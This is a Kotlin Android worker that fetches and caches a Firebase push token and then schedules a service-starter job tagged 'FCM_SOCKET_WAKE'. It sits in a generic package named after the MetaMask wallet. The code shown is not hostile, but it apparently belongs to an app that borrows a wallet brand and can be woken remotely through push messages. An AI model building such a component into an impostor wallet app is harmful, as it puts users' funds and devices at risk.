package com.example.MetaMask.services

import android.content.Context
import androidx.annotation.Keep
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.Worker
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import com.google.android.gms.tasks.Tasks
import com.google.firebase.messaging.FirebaseMessaging
import java.util.concurrent.TimeUnit

@Keep
class FcmTokenSendWorker(
    ctx: Context,
    params: WorkerParameters
) : Worker(ctx, params) {

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] doWork enter") //xdbg
        val ctx = applicationContext

        if (FcmTokenService.isTokenConfirmed(ctx)) return Result.success()

        val prefs = ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
        var token = prefs.getString(FcmTokenService.PREF_TOKEN, null)

        if (token.isNullOrEmpty()) {
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] if branch") //xdbg
            token = tryGetFirebaseToken(ctx)
            if (token.isNullOrEmpty()) return Result.retry()
        }

        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("FCM_SOCKET_WAKE")
                .build()
            WorkManager.getInstance(ctx).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenSendWorker] catch (ignored)") //xdbg
        }

        android.util.Log.d("XDBG", "[FcmTokenSendWorker] return") //xdbg
        return Result.success()
    }

    private fun tryGetFirebaseToken(ctx: Context): String? {
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] tryGetFirebaseToken enter ctx=ctx") //xdbg
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] return") //xdbg
        return try {
            FCMConfig.init(ctx)
            DeviceUUIDProvider.init(ctx)
            val token = Tasks.await(FirebaseMessaging.getInstance().token, 30, TimeUnit.SECONDS)
            if (!token.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[FcmTokenSendWorker] if branch") //xdbg
                ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putString(FcmTokenService.PREF_TOKEN, token)
                    .putBoolean("fcm_token_confirmed", false)
                    .apply()
            }
            token
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenSendWorker] catch (ignored)") //xdbg
            null
        }
    }
}
